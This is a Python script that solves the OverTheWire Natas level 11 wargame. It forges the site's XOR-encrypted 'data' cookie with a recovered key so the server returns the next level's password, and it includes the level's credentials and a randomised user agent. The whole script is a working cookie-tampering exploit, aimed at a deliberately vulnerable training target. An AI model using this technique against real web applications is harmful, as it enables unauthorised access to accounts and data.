#!/usr/bin/python3.9

"""This script is a solution to Overthewire Natas level 11."""

import base64
from itertools import cycle
import requests as r
from requests.auth import HTTPBasicAuth
from fake_useragent import UserAgent

def xor(text,key):
    return ''.join(
        chr(ord(x) ^ ord(y)) for (x,y) in zip(text, cycle(key))
        ).encode('utf8')

url = "http://natas11.natas.labs.overthewire.org/"

lvl_user = "natas11"
lvl_pass = "1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg"

headers = {
    "User-Agent": UserAgent().random
    }

key = 'KNHL'
text = '{"showpassword":"yes","bgcolor":"#ffffff"}'
tampered_cookie = base64.b64encode(xor(text,key)).decode('utf8')

try:
    res = r.get(
        url,
        cookies={"data": tampered_cookie},
        headers=headers, 
        auth=HTTPBasicAuth(lvl_user, lvl_pass))

    if res.status_code == 200:
        password = res.text.split("\n")[-11]
        password = password.split(" ")[-1][0:-4]

    status = res.status_code
except Exception as e:
    print("[ERROR]", e, "\n")
    exit(-1)

if password and password.isalnum() and len(password) == 32:
    print("[PASSWORD]", password)
else:
    print(
        f"[FAIL] - [Status: {status}]",
        f"[Password({len(password)}): {password}]")
